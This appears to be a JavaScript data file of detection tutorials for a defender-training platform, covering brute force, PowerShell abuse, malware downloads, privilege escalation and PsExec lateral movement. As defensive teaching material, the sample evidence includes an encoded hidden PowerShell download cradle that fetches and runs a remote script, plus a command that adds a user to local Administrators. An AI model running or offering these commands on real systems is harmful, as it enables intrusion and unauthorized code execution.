export const tutorials = [
  {
    id: "brute-force-detection",
    title: "Brute Force Detection",
    module: "SOC Case Analysis",
    difficulty: "Easy",
    summary:
      "Learn how to spot repeated failed authentication attempts, identify the attacker source, and confirm when a password guessing attack succeeds.",
    estimatedTime: "8 min",
    concepts: [
      "Authentication failure patterns",
      "EventID 4625 and 4624 correlation",
      "Failure-to-success escalation",
      "Source IP attribution",
    ],
    overview:
      "Brute-force activity often stands out as repeated login failures against one or more accounts, sometimes followed by a successful logon from the same source. A good analyst focuses on the timeline, the source IP, and whether the same account eventually authenticates successfully.",
    whatToLookFor: [
      "Repeated failed logons from the same external IP",
      "A successful sign-in after multiple failures",
      "One account showing a clearer compromise pattern than background noise",
      "Privilege or process activity shortly after the successful login",
    ],
    exampleEvidence: `08:11:24  EventID=4625  user=jmorris   src_ip=203.0.113.77  status=BadPassword
08:11:31  EventID=4625  user=jmorris   src_ip=203.0.113.77  status=BadPassword
08:11:47  EventID=4625  user=jmorris   src_ip=203.0.113.77  status=BadPassword
08:12:03  EventID=4624  user=jmorris   src_ip=203.0.113.77  logon_type=3`,
    commonMistakes: [
      "Looking only at failed logons and missing the later successful one",
      "Assuming every account in the log noise is compromised",
      "Ignoring the source IP because the usernames look familiar",
    ],
    relatedPractice: [
      { label: "Practice in SOC Cases", path: "/soc-cases" },
      { label: "Review Incident Scenarios", path: "/incidents" },
    ],
  },
  {
    id: "suspicious-powershell-activity",
    title: "Suspicious PowerShell Activity",
    module: "SOC Case Analysis",
    difficulty: "Medium",
    summary:
      "Understand how hidden or encoded PowerShell execution appears in process logs, script block logs, and follow-on network activity.",
    estimatedTime: "10 min",
    concepts: [
      "Parent-child process analysis",
      "Encoded PowerShell and hidden windows",
      "Download cradle patterns",
      "Script block logging",
    ],
    overview:
      "PowerShell is a legitimate administration tool, which makes it useful to attackers as well. The key is not to treat every PowerShell execution as malicious, but to focus on suspicious launch context, encoded commands, remote script retrieval, and follow-on persistence or exfiltration behavior.",
    whatToLookFor: [
      "Unusual parent processes such as WINWORD.EXE or mshta.exe",
      "Flags like -enc, -w hidden, or download cradle commands",
      "Script block logs containing remote URLs or obfuscated content",
      "Network connections that line up with the PowerShell execution",
    ],
    exampleEvidence: `parent=WINWORD.EXE
process=powershell.exe
command=powershell.exe -w hidden -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIANAAvAHUAcABkAGEAdABlAC4AcABzADEAJwAp
script_block=IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.24/update.ps1')`,
    commonMistakes: [
      "Flagging all PowerShell as malicious without checking context",
      "Missing the suspicious parent process and focusing only on the child",
      "Ignoring script block logs that reveal the real command",
    ],
    relatedPractice: [
      { label: "Practice in SOC Cases", path: "/soc-cases" },
      { label: "Review CTF Challenges", path: "/challenges" },
    ],
  },
  {
    id: "malware-download-investigation",
    title: "Malware Download Investigation",
    module: "SOC Case Analysis",
    difficulty: "Medium",
    summary:
      "Follow a suspicious download from browser activity to file creation, execution, persistence, and outbound traffic.",
    estimatedTime: "9 min",
    concepts: [
      "Download-to-execution chains",
      "Archive and shortcut abuse",
      "Persistence indicators",
      "User-driven malware execution",
    ],
    overview:
      "Many user-facing malware infections start with a download that looks harmless, then move quickly into file execution, scheduled tasks, registry persistence, or follow-on payload retrieval. The goal is to connect each stage into one coherent timeline.",
    whatToLookFor: [
      "External file download from a user-accessible path",
      "Creation of a suspicious executable, script, or shortcut",
      "Execution by explorer.exe, cmd.exe, mshta.exe, or PowerShell",
      "Persistence artifacts such as scheduled tasks or autoruns",
    ],
    exampleEvidence: `09:14:08  browser_download  url=http://198.51.100.33/files/April_Salary_Report.scr
09:14:10  file_create       path=C:\\Users\\analyst\\Downloads\\April_Salary_Report.scr
09:14:26  process_start     parent=explorer.exe child=April_Salary_Report.scr
09:14:39  network_connect   process=April_Salary_Report.scr dst_ip=198.51.100.33
09:15:11  persistence       task_name=UpdateCheck task_action=C:\\Users\\analyst\\Downloads\\April_Salary_Report.scr`,
    commonMistakes: [
      "Stopping at the initial download without checking execution",
      "Treating the archive or lure file as the final payload automatically",
      "Missing persistence that proves the malware was meant to survive reboots",
    ],
    relatedPractice: [
      { label: "Practice in SOC Cases", path: "/soc-cases" },
      { label: "Review Incident Scenarios", path: "/incidents" },
    ],
  },
  {
    id: "privilege-escalation-basics",
    title: "Privilege Escalation Basics",
    module: "Incident Response",
    difficulty: "Easy",
    summary:
      "Learn how unauthorized admin group membership, special privileges, and abuse of support tooling can reveal privilege escalation.",
    estimatedTime: "9 min",
    concepts: [
      "Local administrator group abuse",
      "Account management events",
      "Special privilege assignment",
      "Containment decisions",
    ],
    overview:
      "Privilege escalation means an attacker or unauthorized user gains higher access than they should have. In workstation-focused cases, this often shows up through group membership changes, scheduled task abuse, or tools that grant administrative rights without proper approval.",
    whatToLookFor: [
      "EventID 4732 or similar group membership changes",
      "The exact user added to a privileged group",
      "Special privileges assigned on a later logon",
      "The containment step needed to remove the elevated access",
    ],
    exampleEvidence: `09:49:41  process_start  user=helpdesk-temp  command=net localgroup Administrators j.nasr /add
09:49:46  EventID=4732    subject=helpdesk-temp  group=Administrators  member=CORP\\j.nasr
09:52:19  EventID=4672    user=j.nasr  privileges=SeDebugPrivilege, SeBackupPrivilege`,
    commonMistakes: [
      "Only identifying the compromised account without confirming the group changed",
      "Ignoring the follow-on privileged logon that proves the escalation worked",
      "Choosing an investigation note instead of an immediate containment action",
    ],
    relatedPractice: [
      { label: "Practice in Incident Response", path: "/incidents" },
      { label: "Review CTF Challenges", path: "/challenges" },
    ],
  },
  {
    id: "lateral-movement-with-psexec",
    title: "Lateral Movement with PsExec",
    module: "Incident Response",
    difficulty: "Medium",
    summary:
      "Recognize how PsExec-style remote execution appears through ADMIN$ access, service installation, and follow-on activity on a remote host.",
    estimatedTime: "11 min",
    concepts: [
      "Remote administration abuse",
      "PSEXESVC service artifacts",
      "Pivot host identification",
      "Cross-host execution chains",
    ],
    overview:
      "PsExec is a legitimate Sysinternals tool, but it is also commonly abused for lateral movement. The most useful indicators are temporary service creation, administrative share access, and a remote execution chain that jumps from one host to another.",
    whatToLookFor: [
      "ADMIN$ access before remote execution",
      "Creation of the PSEXESVC service",
      "The first host that was reached remotely",
      "Whether that host later became a pivot to another system",
    ],
    exampleEvidence: `ENG-WS17  smb_access     target=APP-SRV06 share=ADMIN$
ENG-WS17  service_create  target=APP-SRV06 service=PSEXESVC
APP-SRV06 process_start   parent=PSEXESVC.exe child=cmd.exe
APP-SRV06 task_create     target=FS-ARCHIVE01 task_name=DailySyncCheck`,
    commonMistakes: [
      "Focusing only on the final host and missing the pivot system",
      "Treating any remote service creation as PsExec without checking the service name",
      "Ignoring the relationship between the originating workstation and the remote host",
    ],
    relatedPractice: [
      { label: "Practice in Incident Response", path: "/incidents" },
      { label: "Practice in SOC Cases", path: "/soc-cases" },
    ],
  },
  {
    id: "incident-response-workflow",
    title: "Incident Response Workflow",
    module: "Incident Response",
    difficulty: "Easy",
    summary:
      "Understand the logic of moving from initial triage to technical analysis and then to the first containment decision in a structured lab.",
    estimatedTime: "7 min",
    concepts: [
      "Triage versus deep analysis",
      "Step-by-step investigations",
      "Evidence-driven answers",
      "Immediate containment actions",
    ],
    overview:
      "A good incident response workflow does not jump straight to remediation. Analysts first identify the most important suspicious artifact, validate what happened technically, and only then decide the safest immediate containment action. That same sequence is used throughout the platform's step-based incident labs.",
    whatToLookFor: [
      "The first artifact that best anchors the investigation",
      "Technical proof of attacker behavior or tool usage",
      "A containment action that reduces risk without causing unnecessary damage",
      "Whether each answer is directly supported by evidence",
    ],
    exampleEvidence: `Step 1  Initial Triage       -> Which artifact should you investigate first?
Step 2  Technical Analysis   -> What behavior or tool does the evidence confirm?
Step 3  Containment Decision -> What immediate action should reduce the threat safely?`,
    commonMistakes: [
      "Skipping triage and guessing the final answer too early",
      "Confusing root cause with immediate containment",
      "Choosing a broad remediation plan instead of the first safe action",
    ],
    relatedPractice: [
      { label: "Practice in Incident Response", path: "/incidents" },
      { label: "Review SOC Cases", path: "/soc-cases" },
      { label: "Review CTF Challenges", path: "/challenges" },
    ],
  },
];

export const getTutorialById = (id) => {
  return tutorials.find((tutorial) => tutorial.id === id) || null;
};
